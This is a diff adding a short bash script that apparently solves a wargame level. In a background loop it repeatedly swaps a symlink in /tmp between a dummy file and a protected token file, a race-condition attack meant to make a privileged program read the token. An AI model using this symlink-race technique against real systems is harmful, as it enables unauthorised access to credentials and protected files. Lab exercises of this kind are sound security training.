@@ -1,0 +1,12 @@
+#!/bin/bash
+
+set -eu
+
+while true
+do
+  echo "DUMMY"
+  ln -sf /tmp/dummy /tmp/outward
+  echo "TARGET"
+  ln -sf /home/user/level10/token /tmp/outward
+done&
+echo "DONE."
